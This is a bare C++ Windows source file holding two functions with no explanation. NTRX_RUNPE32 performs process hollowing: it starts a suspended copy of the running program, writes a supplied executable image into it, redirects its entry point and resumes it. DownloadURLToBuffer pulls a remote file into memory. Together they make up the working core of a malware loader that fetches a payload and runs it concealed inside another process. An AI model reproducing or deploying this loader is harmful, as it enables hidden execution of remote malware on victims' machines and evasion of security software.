#include <Windows.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")

int NTRX_RUNPE32(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	DWORD* ImageBase = NULL;
	void* pImageBase = NULL;
	int count;
	char CurrentFilePath[1024];
	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
	GetModuleFileNameA(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));
		bool threadcreated = CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
		if (threadcreated == true)
		{
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
				if (pImageBase == 00000000) {
					ResumeThread(PI.hThread);
					ExitProcess(NULL);
					return 1;
				}
				if (pImageBase > 0) {
					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
						LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
					ResumeThread(PI.hThread);
					return 0;
				}
			}
		}
	}
}


LPSTR DownloadURLToBuffer(LPCSTR lpszURL)
{
	LPSTR lpResult = NULL;
	LPSTREAM lpStream;
	if (lpszURL && SUCCEEDED(URLOpenBlockingStreamA(NULL, lpszURL, &lpStream, 0, NULL))) {
		STATSTG statStream;
		if (SUCCEEDED(lpStream->Stat(&statStream, STATFLAG_NONAME))) {
			DWORD dwSize = statStream.cbSize.LowPart + 1;
			lpResult = (LPSTR)malloc(dwSize);
			if (lpResult) {
				LARGE_INTEGER liPos;
				ZeroMemory(&liPos, sizeof(liPos));
				ZeroMemory(lpResult, dwSize);
				lpStream->Seek(liPos, STREAM_SEEK_SET, NULL);
				lpStream->Read(lpResult, dwSize - 1, NULL);
			}
		}
		lpStream->Release();
	}
	return lpResult;
}

